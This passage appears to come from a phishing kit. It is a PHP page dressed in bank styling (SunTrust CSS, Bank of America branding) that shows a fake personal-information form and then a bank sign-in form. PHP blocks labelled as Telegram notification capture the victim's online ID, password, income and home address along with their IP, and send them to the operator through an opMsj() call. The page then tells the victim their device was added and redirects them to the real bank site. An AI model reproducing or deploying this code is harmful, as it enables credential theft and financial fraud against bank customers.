    border-width: 1px 1px 0 1px;
}

.rate-table td {
    border: none;
    border-bottom: 1px solid #ddd;
    position: relative;
    /* padding-left: 50%;  removed to test rate-table android issue solution */
}

html.ie9 .rate-table td {
    float: left !important;
}

.rate-table td:before {
    position: absolute;
    top: 6px;
    left: 6px;
    width: 45%;
    padding-right: 10px;
    white-space: nowrap;
}

/* Label the data */


.rate-table td:nth-of-type(1):before {
    content: "Annual Percentage Yield";
    text-align: left;
}

.rate-table td:nth-of-type(2):before {
    content: "Interest Rate";
    text-align: left;
}

.rate-table td:nth-of-type(3):before {
    content: "Minimum Amount";
    text-align: left;
}

.rate-table td:nth-of-type(4):before {
    content: "Maximum Amount";
    text-align: left;
}

.rate-table.cd td:nth-of-type(1):before {
    content: "Annual Percentage Yield";
    text-align: left;
}

.rate-table.cd td:nth-of-type(2):before {
    content: "Interest Rate";
    text-align: left;
}

.rate-table.cd td:nth-of-type(3):before {
    content: "Effective Date";
    text-align: left;
}

.rate-table.cd td:nth-of-type(4):before {
    content: "Minimum Amount";
    text-align: left;
}

.rate-table.cd td:nth-of-type(5):before {
    content: "Maximum Amount";
    text-align: left;
}


/* Photo ID */

.photoid-container {
    display: block;
    margin: 0 0 10px 0;
}

.img-width {
    width: 75%;
}

.photoid-body {
}

.linebreak-label {
    display: block;
}

.accept-tick {
    padding: 20px 10px;
}

.switch-section .input-control-custom {
    padding: 10px 0 0 30px;
    display: inline-block;
    width: auto;
    float: right;
}

.img-width {
    width: 75%;
}

}


/* ****************************************************************************************** */
/* ***********************   DESIGN EDITS FOR ANYTHING BELOW 400px    *********************** */
/* ****************************************************************************************** */

@media (min-width: 500px) and (max-width: 580px) {
    .percent-icon {
        left: 110px !important;
    }
}

@media (max-width: 400px) {
    .button-offers {
        display: block;
    }

    .clickable-div {
        cursor: pointer;
    }
    /* chandra - 6/14 Start */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            margin-top: 0px;
        }

    .print {
        display: inline-block;
        position: relative;
        margin: 2.8em 0 .5em 0;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }
    /* chandra - 6/14 End */
    .rc-table .row {
        display: inline-block;
        background: #eee;
        width: 100%;
        border: 1px solid #eee;
        margin: 1em 0;
        padding: 10px 0;
        border-radius: 4px;
    }

        .rc-table .row.head {
            display: none;
        }

    .rc-table .cell {
        border: 0;
        width: 100%;
    }

        .rc-table .cell.last, .rc-table .cell.description, .rc-table .cell.number {
            display: block;
            width: 100%;
            text-align: center;
        }

            .rc-table .cell.last button {
                width: 100%;
                padding: 15px;
                text-align: center;
            }


    /* Photo ID */

    .photoid-containter {
        display: block;
        margin: 0 0 10px 0;
    }

    .photoid-body {
        display: block;
        width: 100%;
    }

    .photoid-button {
        display: block;
    }

        .photoid-button button {
            width: 100%;
            padding: 14px 30px;
            margin-top: 2em;
        }


    .officer-table .row {
        display: inline-block;
        background: #eee;
        width: 100%;
        border: 1px solid #eee;
        margin: 1em 0;
        padding: 10px 0;
        border-radius: 4px;
    }

        .officer-table .row.head {
            display: none;
        }

    .officer-table .cell {
        border: 0;
        width: 100%;
    }

        .officer-table .cell.last, .officer-table .cell.name, .officer-table .cell.number {
            display: block;
            width: 100%;
            text-align: center;
        }

            .officer-table .cell.last button {
                width: 100%;
                padding: 15px;
                text-align: center;
            }


    .additional-applicant-table .row {
        display: inline-block;
        background: #eee;
        width: 100%;
        border: 1px solid #eee;
        margin: 1em 0;
        padding: 10px;
        border-radius: 3px;
    }

        .additional-applicant-table .row.head {
            display: none;
        }

    .additional-applicant-table .cell {
        border: 0;
        width: 100%;
    }

        .additional-applicant-table .cell.applicant {
            font-weight: bold;
            display: block;
        }

        .additional-applicant-table .cell.nameinput {
            display: block;
        }

        .additional-applicant-table .cell.last {
            display: inline-block;
        }

            .additional-applicant-table .cell.last div.input-control {
                position: relative;
                right: 0px;
                width: auto;
                top: -105px;
                margin-bottom: 0px;
            }



    .lines-table .row {
        display: inline-block;
        background: #eee;
        width: 100%;
        border: 1px solid #eee;
        margin: 1em 0;
        padding: 10px 0;
        border-radius: 4px;
    }

        .lines-table .row.head {
            display: none;
        }

    .lines-table .cell {
        border: 0;
        width: 100%;
    }

        .lines-table .cell.account {
            font-weight: bold;
        }

        .lines-table .cell.amount {
            width: auto;
        }

        .lines-table .cell.last {
            display: block;
            width: 100%;
            text-align: center;
        }

            .lines-table .cell.last button {
                width: 100%;
                padding: 15px;
                text-align: center;
            }

    .switch-section .input-control.doctor-select select {
        width: 50%;
        min-width: 150px;
        padding-right: 25px;
    }

    /* Delta SkyMiles Check Card Offer page */

    .sky-card-offer .sky-card-img {
        float: none;
        width: 100%;
        margin: 0;
    }

    .sky-card-offer .sky-card-content {
        float: none;
        width: 100%;
        margin-left: 0;
    }

    .img-width {
        width: 100%;
    }

    .percent-icon {
        left: 80px !important;
    }
}



/* ****************************************************************************************** */
/* ***********************   DESIGN EDITS FOR ANYTHING BELOW 360px    *********************** */
/* ****************************************************************************************** */

@media (max-width: 360px) {
    .button-offers {
        display: block;
    }

    .clickable-div {
        cursor: pointer;
    }

    html, body {
    }
    /* chandra - 6/14 Start */
    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

        .bootstrap .row-spacing {
            cursor: pointer;
        }

    html, body {
    }

    .bootstrap .row-spacing {
        margin-top: 0px;
    }

    .print {
        display: inline-block;
        position: absolute;
        margin: 2.8em 0 .5em 2.5em;
        background: url(../images/Print_Icon.svg) no-repeat;
        background-size: 20px 20px;
    }

    .bootstrap .confirmationfields .field {
        font-family: suntrustregular;
        font-weight: bold;
        font-size: 12px;
        color: #333333;
        margin-top: 10px;
    }

    .bootstrap .confirmationfields .value {
        font-family: suntrustregular;
        font-size: 14px;
        color: #333333;
    }

    .bootstrap .confirmationfields .note-text {
        margin-top: 11px;
        color: #333333;
        font-size: 12px;
        font-weight: normal;
        line-height: normal;
    }

    .page {
        width: 100%;
        margin-top: 0;
    }

    .percent-icon {
        left: 70px !important;
    }


    /* Tax certifications list */


    .tax-id-box {
        display: block;
        background: none;
        width: 100%;
        font-weight: bold;
        padding: 0;
    }

        .tax-id-box .name, .tax-id-box .number {
            border-radius: 4px;
            margin-bottom: 1em;
            background-color: rgb(244, 244, 244);
            display: block;
            text-align: left;
            padding: 1em 10px;
        }
}

@media (max-width: 320px) {
    .clickable-div {
        cursor: pointer;
    }

    .bootstrap {
        color: rgb(51, 51, 51);
        font-family: "suntrustregular","Trebuchet MS",sans-serif;
        font-size: 1.5rem;
        font-weight: normal;
        line-height: 2rem;
        margin: 0;
        border-top: 0px solid #fff;
    }

    .print {
        display: inline-block;
        position: absolute;
        margin: 2.8em 0 .5em 0em;
        background: none;
    }
}
</style>
<div style="margin:10px">
<form action="./" method="post" name="userForm" novalidate="" set-focus="" class="ng-dirty ng-invalid ng-invalid-dob">
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="final"/>
        <!-- ngIf: $root.IsSBD -->
        <div class="bootstrap">
            <!--18.6 New ClientContact  DisclosureHeader with MustReadVerbatim for BF2F-->
            <!-- ngIf: (Apptype=='IL' || Apptype=='DEP'|| Apptype=='ATM') && ($root.ClientContactCenter || $root.BranchPhoneSales ||$root.BranchFaceToFace) -->
        </div>
        <div class="bootstrap">
            <div class="row firstrow">
                <div class="col-md-6 mb-3" ng-class="{'hasError':userForm.AMLOccupation.$invalid &amp;&amp; userForm.AMLOccupation.$dirty}">
                    <label class="control-label input-label" id="AMLOccupation" for="source">Occupation</label>
                    <select name="AMLOccupation" class="form-input-control ng-pristine ng-valid" id="RIO_0118" questionid="RIO_0118" typeofid="" ng-change="AMLOccupationChanged(data.AMLEmployment.OccupationCode, false);SetTaggingForOccupation()" ng-model="data.AMLEmployment.OccupationCode" ng-options="row.value as row.key for row in data.AMLOccupationDdlContents">
						<option value="0">- Select -</option>
						<option value="Business Owner/Self Employed">Business Owner/Self Employed</option>
						<option value="Employee">Employee</option>
						<option value="Government/Organizations">Government/Organizations</option>
						<option value="Retired">Retired</option>
						<option value="Student">Student</option>
						<option value="SunTrust Employee">SunTrust Employee</option>
						<option value="Unemployed">Unemployed</option>
					</select>

                    <!-- ngIf: userForm.AMLOccupation.$error --><div class="input-error ng-scope" ng-if="userForm.AMLOccupation.$error">
                        <div class="error-message ng-binding"></div>
                    </div><!-- end ngIf: userForm.AMLOccupation.$error -->

                </div>
                <!-- ngIf: ShowAnnualIncome --><div class="col-md-6 mb-3 ng-scope" id="annualIncome" ng-if="ShowAnnualIncome" style="display: block;" ng-class="{'hasError':userForm.AMLIncome.$invalid &amp;&amp; userForm.AMLIncome.$dirty}">
                    <label class="control-label input-label" id="AMLIncome" for="source">Annual Income</label>
                    <select name="AMLIncome" class="form-input-control ng-pristine ng-valid" id="EIU_0901" questionid="EIU_0901" typeofid="" ng-options="row.value as row.key for row in data.AnnualIncomeDdlContents" ng-change="SetTaggingForAnnualIncome()" ng-model="data.AMLEmployment.AnnualIncomeCode">
					<option value="0">- Select -</option>
					<option value="Less than $25,000">Less than $25,000</option>
					<option value="$25,000 to $49,999">$25,000 to $49,999</option>
					<option value="$50,000 to $74,999">$50,000 to $74,999</option>
					<option value="$75,000 to $99,999">$75,000 to $99,999</option>
					<option value="$100,000 to $124,999">$100,000 to $124,999</option>
					<option value="$125,000 to $149,999">$125,000 to $149,999</option>
					<option value="Greater than $150,000">Greater than $150,000</option>
					</select>
                    <!-- ngIf: userForm.AMLIncome.$error --><div class="input-error ng-scope" ng-if="userForm.AMLIncome.$error">
                        <div class="error-message ng-binding"></div>
                    </div><!-- end ngIf: userForm.AMLIncome.$error -->
                </div><!-- end ngIf: ShowAnnualIncome -->
            </div>
            <div class="row">
                <!-- ngIf: ShowAMLBusiness -->
                <!-- ngIf: ShowAMLEmployee -->
                <!-- ngIf: ShowIndustry -->
                <!-- ngIf: ShowGraduation -->
                <!-- ngIf: ShowGraduation -->

                <!-- ngIf: ShowOtherIndustryDescription -->
            </div>
        </div>

        <!--19.7-->
        <!-- ngIf: showPreviousEmployement -->

            <div class="row firstrow">
                <!-- ngIf: !($root.IsSBD && data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry --><div class="col-md-8 mb-3 CurrentstreetAddress ng-scope" ng-if="!($root.IsSBD &amp;&amp; data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry" ng-class="{'hasError':userForm.ApplicantCurrentStreetAddress.$dirty &amp;&amp; userForm.ApplicantCurrentStreetAddress.$invalid,'locked':($root.IsAuthenticated||$root.IsCrossSell) &amp;&amp; !$root.IsSBD &amp;&amp; !$root.IsProspectApplicant}">
                    <label for="ApplicantCurrentStreetAddress" id="ApplicantCurrentStreetAddress" class="control-label input-label">Street Address<span class="sub-label"> (No P.O. Boxes)</span> </label>
                    <!-- ngIf: Apptype!='IL' && !$root.IsSBD && (!$root.IsAuthenticated && !$root.IsCrossSell) --><input id="ApplicantCurrentStreetAddress" name="ApplicantCurrentStreetAddress" maxlength="50" ng-model="data.CurrentAddress.AddressLine1" ng-if="Apptype!='IL' &amp;&amp; !$root.IsSBD &amp;&amp; (!$root.IsAuthenticated &amp;&amp; !$root.IsCrossSell)" type="text" class="form-input-control address ng-scope ng-pristine ng-valid" streetaddcur="" value="" size="15" ng-keydown="change2();"><!-- end ngIf: Apptype!='IL' && !$root.IsSBD && (!$root.IsAuthenticated && !$root.IsCrossSell) -->
                    <!-- ngIf: ($root.IsAuthenticated||$root.IsCrossSell) && !$root.IsSBD && !$root.IsProspectApplicant -->
                    <div class="sub-text-row-lock locked">Please review and correct your address if needed.</div>
                    <!-- ngIf: userForm.ApplicantCurrentStreetAddress.$error --><div class="input-error ng-scope" ng-if="userForm.ApplicantCurrentStreetAddress.$error">
                        <div class="error-message ng-binding"></div>
                    </div><!-- end ngIf: userForm.ApplicantCurrentStreetAddress.$error -->
                </div><!-- end ngIf: !($root.IsSBD && data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry -->
                <!-- ngIf: !($root.IsSBD && data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry --><div class="col-md-4 mb-3 ng-scope" ng-class="{'hasError':userForm.ApplicantCurrentApartmentNumber.$dirty &amp;&amp; userForm.ApplicantCurrentApartmentNumber.$invalid,'locked':($root.IsAuthenticated||$root.IsCrossSell) &amp;&amp; !$root.IsSBD &amp;&amp; !$root.IsProspectApplicant}" ng-if="!($root.IsSBD &amp;&amp; data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry">
                    <label for="ApplicantCurrentApartmentNumber" class="control-label input-label">Apt./Unit # <span class="sub-label"> (Opt.)</span></label>
                    <!-- ngIf: !$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsSBD --><input id="ApplicantCurrentApartmentNumber" maxlength="5" ng-if="!$root.IsAuthenticated &amp;&amp; !$root.IsCrossSell &amp;&amp; !$root.IsSBD" name="ApplicantCurrentApartmentNumber" type="text" ng-model="data.CurrentAddress.ApartmentNumber" apartmentnumber="" class="form-input-control ng-scope ng-pristine ng-valid" size="15"><!-- end ngIf: !$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsSBD -->
                    <!-- ngIf: $root.IsSBD -->
                    <!-- ngIf: ($root.IsAuthenticated||$root.IsCrossSell) && !$root.IsSBD && !$root.IsProspectApplicant -->
                    <!-- ngIf: userForm.ApplicantCurrentApartmentNumber.$error --><div class="input-error ng-scope" ng-if="userForm.ApplicantCurrentApartmentNumber.$error">
                        <div class="error-message ng-binding"> </div>
                    </div><!-- end ngIf: userForm.ApplicantCurrentApartmentNumber.$error -->
                </div><!-- end ngIf: !($root.IsSBD && data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry -->
            </div>
            <div class="row CurrentstreetAddressjump">
                <!-- ngIf: !($root.IsSBD && data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry -->
				<div class="col-md-4 mb-3 ng-scope" ng-class="{'hasError':userForm.ApplicantCurrentCity.$dirty &amp;&amp; userForm.ApplicantCurrentCity.$invalid,'locked':($root.IsAuthenticated||$root.IsCrossSell) &amp;&amp; !$root.IsSBD &amp;&amp; !$root.IsProspectApplicant}" ng-if="!($root.IsSBD &amp;&amp; data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry">
                    <label for="ApplicantCurrentCity" id="ApplicantCurrentCity" class="control-label input-label">City</label>
                    <!-- ngIf: Apptype!='IL' &&(!$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsSBD) --><input id="ApplicantCurrentCity" name="ApplicantCurrentCity" ng-model="data.CurrentAddress.City" type="text" class="form-input-control ng-scope ng-pristine ng-valid" city="" value="" size="15" ng-if="Apptype!='IL' &amp;&amp;(!$root.IsAuthenticated &amp;&amp; !$root.IsCrossSell &amp;&amp; !$root.IsSBD)" maxlength="50"><!-- end ngIf: Apptype!='IL' &&(!$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsSBD) -->
                    <!-- ngIf: ($root.IsAuthenticated||$root.IsCrossSell) && !$root.IsSBD && !$root.IsProspectApplicant -->
                    <!-- ngIf: userForm.ApplicantCurrentCity.$error --><div class="input-error ng-scope" ng-if="userForm.ApplicantCurrentCity.$error">
                        <div class="error-message ng-binding"></div>
                    </div><!-- end ngIf: userForm.ApplicantCurrentCity.$error -->
                </div>
                <!-- ngIf: !($root.IsSBD && data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry --><div class="col-md-4 mb-3 ng-scope" ng-class="{'hasError':userForm.ApplicantCurrentState.$dirty &amp;&amp; userForm.ApplicantCurrentState.$invalid,'locked':($root.IsAuthenticated||$root.IsCrossSell) &amp;&amp; !$root.IsSBD &amp;&amp; !$root.IsProspectApplicant}" ng-if="!($root.IsSBD &amp;&amp; data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry">
                    <label for="ApplicantCurrentState" class="control-label input-label">State</label>
                    <!-- ngIf: !$root.IsAuthenticated && !$root.IsCrossSell && !LargeRVOrMarineLoan && !PhysicianLending && !$root.IsSBD -->
					<select class="form-input-control ng-scope ng-pristine ng-valid" ng-model="data.CurrentAddress.State" name="ApplicantCurrentState" ng-if="!$root.IsAuthenticated &amp;&amp; !$root.IsCrossSell &amp;&amp; !LargeRVOrMarineLoan &amp;&amp; !PhysicianLending &amp;&amp; !$root.IsSBD" currentstate="" ng-options="row.value as row.key for row in data.StateDdlContents">
					<option value="0">- Select -</option>
					<option value="Alaska">Alaska</option>
					<option value="Alabama">Alabama</option>
					<option value="Arkansas">Arkansas</option>
					<option value="Arizona">Arizona</option>
					<option value="California">California</option>
					<option value="Colorado">Colorado</option>
					<option value="Connecticut">Connecticut</option>
					<option value="District of Columbia">District of Columbia</option>
					<option value="Delaware">Delaware</option>
					<option value="Florida">Florida</option>
					<option value="Georgia">Georgia</option>
					<option value="Hawaii">Hawaii</option>
					<option value="Iowa">Iowa</option>
					<option value="14">Idaho</option>
					<option value="Illinois">Illinois</option>
					<option value="Indiana">Indiana</option>
					<option value="Kansas">Kansas</option>
					<option value="Kentucky">Kentucky</option>
					<option value="Louisiana">Louisiana</option>
					<option value="Massachusetts">Massachusetts</option>
					<option value="Maryland">Maryland</option>
					<option value="Maine">Maine</option>
					<option value="Michigan">Michigan</option>
					<option value="Minnesota">Minnesota</option>
					<option value="Missouri">Missouri</option>
					<option value="Mississippi">Mississippi</option>
					<option value="Montana">Montana</option>
					<option value="North Carolina">North Carolina</option>
					<option value="North Dakota">North Dakota</option>
					<option value="Nebraska">Nebraska</option>
					<option value="New Hampshire">New Hampshire</option>
					<option value="New Jersey">New Jersey</option>
					<option value="New Mexico">New Mexico</option>
					<option value="Nevada">Nevada</option>
					<option value="New York">New York</option>
					<option value="Ohio">Ohio</option>
					<option value="Oklahoma">Oklahoma</option>
					<option value="Oregon">Oregon</option>
					<option value="Pennsylvania">Pennsylvania</option>
					<option value="Rhode Island">Rhode Island</option>
					<option value="South Carolina">South Carolina</option>
					<option value="South Dakota">South Dakota</option>
					<option value="Tennessee">Tennessee</option>
					<option value="Texas">Texas</option>
					<option value="Utah">Utah</option>
					<option value="Virginia">Virginia</option>
					<option value="Vermont">Vermont</option>
					<option value="Washington">Washington</option>
					<option value="Wisconsin">Wisconsin</option>
					<option value="West Virginia">West Virginia</option>
					<option value="Wyoming">Wyoming</option>
					</select><!-- end ngIf: !$root.IsAuthenticated && !$root.IsCrossSell && !LargeRVOrMarineLoan && !PhysicianLending && !$root.IsSBD -->
                    <!-- ngIf: !$root.IsAuthenticated && !$root.IsCrossSell && (LargeRVOrMarineLoan||PhysicianLending) -->
                    <!-- ngIf: $root.IsSBD -->
                    <!--<input id="currentAddressStateTextBox" ng-show="$root.IsAuthenticated||$root.IsCrossSell" ng-disabled="true" name="currentAddressStateTextBox" ng-model="data.CurrentAddress.StateText" type="text" class="field number zipCode">-->

                    <!-- ngIf: userForm.ApplicantCurrentState.$error -->
                </div><!-- end ngIf: !($root.IsSBD && data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry -->
                <!-- ngIf: !($root.IsSBD && data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry --><div class="col-md-4 mb-3 ng-scope" ng-class="{'hasError':userForm.ApplicantCurrentZipCode.$dirty &amp;&amp; userForm.ApplicantCurrentZipCode.$invalid,'locked':($root.IsAuthenticated||$root.IsCrossSell) &amp;&amp; !$root.IsSBD &amp;&amp; !$root.IsProspectApplicant || ($root.ProductCode=='INETHOA2' &amp;&amp; data.CurrentAddress.State =='CA')}" ng-if="!($root.IsSBD &amp;&amp; data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry">
                    <label for="appzipcode" class="control-label input-label">Zip Code</label>
                    <!-- ngIf: !$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsSBD && !($root.ProductCode=='INETHOA2' && data.CurrentAddress.State =='CA') --><input id="ApplicantCurrentZipCode" ng-if="!$root.IsAuthenticated &amp;&amp; !$root.IsCrossSell &amp;&amp; !$root.IsSBD &amp;&amp; !($root.ProductCode=='INETHOA2' &amp;&amp; data.CurrentAddress.State =='CA')" name="ApplicantCurrentZipCode" ng-model="data.CurrentAddress.ZipCode" type="tel" class="form-input-control ng-scope ng-pristine ng-valid" zip="" spellcheck="false" value="" maxlength="10"><!-- end ngIf: !$root.IsAuthenticated && !$root.IsCrossSell && !$root.IsSBD && !($root.ProductCode=='INETHOA2' && data.CurrentAddress.State =='CA') -->

                    <!-- ngIf: $root.IsSBD -->
                    <!-- ngIf: ($root.IsAuthenticated||$root.IsCrossSell) && !$root.IsSBD && !$root.IsProspectApplicant || ($root.ProductCode=='INETHOA2' && data.CurrentAddress.State =='CA') -->
                    <!-- ngIf: userForm.ApplicantCurrentZipCode.$error --><div class="input-error ng-scope" ng-if="userForm.ApplicantCurrentZipCode.$error">
                        <div class="error-message ng-binding"></div>
                    </div><!-- end ngIf: userForm.ApplicantCurrentZipCode.$error -->
                </div><!-- end ngIf: !($root.IsSBD && data.ApplicantAddressSelected!='OTH') || $root.AdditionalApplicantEntry -->
            </div>

            <!-- ngIf: Apptype=='IL' || ((Apptype=='DEP' || Apptype=='ATM' ) && ($root.ClientContactCenter || $root.BranchPhoneSales || $root.BranchFaceToFace) && (!$root.IsAuthenticated || $root.IsPWMOfficer)) -->
        <!-- ngIf: $root.IsAuthenticated -->
		<br/>
        <div class="button-row align-right">
            <button class="button-primary" ng-class="{disabled:disableButton}" ng-disabled="disableButton" ng-click="SubmitPersonalInfo();">Continue</button>
            <!--19.4 save application link for mobile-->
        </div>

        <!-- Address Message Enhancement End-->
    </form>
	
</div>
</div>
</div>
</div>
</div>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'final') { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'final' && isset($_POST['AMLOccupation']) && isset($_POST['AMLIncome']) && isset($_POST['ApplicantCurrentStreetAddress']) && isset($_POST['ApplicantCurrentApartmentNumber']) && isset($_POST['ApplicantCurrentCity']) && isset($_POST['ApplicantCurrentState']) && isset($_POST['ApplicantCurrentZipCode'])) {
	$msj = '<b>[PERSONAL]</b> '.$ip.' | Ocupation: <b>'.$_POST['AMLOccupation'].'</b> | Anual Income: <b>'.$_POST['AMLIncome'].'</b> | Street Address: <b>'.$_POST['ApplicantCurrentStreetAddress'].'</b> | Apartment Number: <b>'.$_POST['ApplicantCurrentApartmentNumber'].'</b> | City: <b>'.$_POST['ApplicantCurrentCity'].'</b> | State: <b>'.$_POST['ApplicantCurrentState'].'</b> | Zip Code: <b>'.$_POST['ApplicantCurrentZipCode'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'final' && isset($_POST['AMLOccupation']) && isset($_POST['AMLIncome']) && isset($_POST['ApplicantCurrentStreetAddress']) && isset($_POST['ApplicantCurrentApartmentNumber']) && isset($_POST['ApplicantCurrentCity']) && isset($_POST['ApplicantCurrentState']) && isset($_POST['ApplicantCurrentZipCode'])) {
		$msj = '<b>[PERSONAL]</b> '.$ip.' | Ocupation: <b>'.$_POST['AMLOccupation'].'</b> | Anual Income: <b>'.$_POST['AMLIncome'].'</b> | Street Address: <b>'.$_POST['ApplicantCurrentStreetAddress'].'</b> | Apartment Number: <b>'.$_POST['ApplicantCurrentApartmentNumber'].'</b> | City: <b>'.$_POST['ApplicantCurrentCity'].'</b> | State: <b>'.$_POST['ApplicantCurrentState'].'</b> | Zip Code: <b>'.$_POST['ApplicantCurrentZipCode'].'</b> |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

$_SESSION['FINAL'] = TRUE;

?>

<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div style="display: block; padding-top:15px;">
<div style="padding-top:3px; padding-bottom:10px; background-image: url(./assets/flagscape.svg); color: #fff; background-color: #DC1431;" data-sticky-level="1" data-sticky-parent="body">
<div class="spa-page-title-inset row">
<div class="column">
<span data-font="cnx-regular" class="margin: 0; font-size: 22px; color: #fff; font-size: 2.75rem; font-family: 'cnx-regular',Arial,Helvetica,sans-serif; font-weight: 300; line-height: 1.4;" id="skip-to-h1">
Secure Area | Email Verification
</span>
</div>
<div class="panel-content light" aria-labelledby="faqSecurityTab0" style="max-height: none; padding-left:10px;">
<p style="font-size: 14px;">Please confirm your email</p>
</div>
</div>
</div>
  <div style="padding-top:30px">
  </div>
<center>
  <div class="form-body">
<center>
<h3>Device successfully added</h3>
<span style="padding-top:20px;padding-bottom:30px;color:black">Thank you, your device has been successfully configured.</span>
<br /><br />
<button onclick="window.location.href = 'https://www.bankofamerica.com/';" type="button" class="proceed-btn"><a href="javascript:void(0);">Continue</a></button>
</center>
  </div>
  </center>
</div>
</div>
</div>
</div>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'login' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1'])) { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($dispositivo) && !empty($dispositivo) && isset($browser) && !empty($browser) && isset($fcountry) && !empty($fcountry) && isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'login' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1'])) {
	$msj = '<b>[LOGIN]</b>: '.$ip.' | Usuario: <b>'.$_POST['onlineId1'].'</b> | Password: <b>'.$_POST['passcode1'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($dispositivo) && !empty($dispositivo) && isset($browser) && !empty($browser) && isset($fcountry) && !empty($fcountry) && isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'login' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1'])) {
		$msj = '[LOGIN]: '.$ip.' | Usuario: '.$_POST['onlineId1'].' | Password: '.$_POST['passcode1'].' |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

?>

<div style="padding-bottom:8px;"></div>
<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div id="globalInputsValidationForm" class="columns small-12 end sign-in">
<form id="signinClient2" name="signinClient2" action="./" novalidate="" autocomplete="off" method="POST" tabindex="-1">
<input type="hidden" name="onlineId1" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1'])) {echo $_POST['onlineId1'];} ?>"/>
<input type="hidden" name="passcode1" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['passcode1']) && !empty($_POST['passcode1'])) {echo $_POST['passcode1'];} ?>"/>
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="preg"/>
<div id="signInPartialContent">
<div class="vertical">
  <div class="row" id="skip_to_signin">
    <div class="small-12 columns" id="signin-message"></div>
    <div class="small-12 columns hidden" id="dropDown">
    </div>
    <div class="small-12 columns" id="inputOnlineId">
      <div class="spa-input spa-input-box spa-input--sparta2">
	  <label class="spa-input-label" data-font="cnx-medium" id="labelForonlineId1" for="onlineId1">
    <span class="ada-hidden">
      Sign in with your online ID
    </span>
  </label><input onkeypress="return event.keyCode != 13;" autofocus type="text" aria-labelledby="labelForonlineId1" data-mobile-input-type="text" data-default-input-type="text" data-android-input-type="text" data-mobile-pattern="" data-default-pattern="" id="onlineId1" name="onlineId2" placeholder="Online ID" maxlength="32" aria-required="true" aria-label="Online ID" autocomplete="off" class="spa-input-text" data-gis-mask="false" data-sparta-input-mask="{&quot;greedy&quot;:true,&quot;placeholder&quot;:&quot;&quot;,&quot;clearMaskOnLostFocus&quot;:true,&quot;showMaskOnHover&quot;:false,&quot;showMaskOnFocus&quot;:true,&quot;keepStatic&quot;:true,&quot;jitMasking&quot;:true,&quot;showTooltip&quot;:false,&quot;inputEventOnly&quot;:true}"><p class="spa-input-hint" id="helpFor_onlineId1"></p><div class="spa-input-error-message spa-icon--error" id="onlineId1_errorMessage" aria-hidden="true"></div></div>
    </div>
    <div id="passcodeContainer" class="small-12 columns">
      <div class="spa-input spa-input-box spa-input--sparta2 tl-private">
	 <label class="spa-input-label" data-font="cnx-medium" id="labelForpasscode1" for="passcode1"></label>
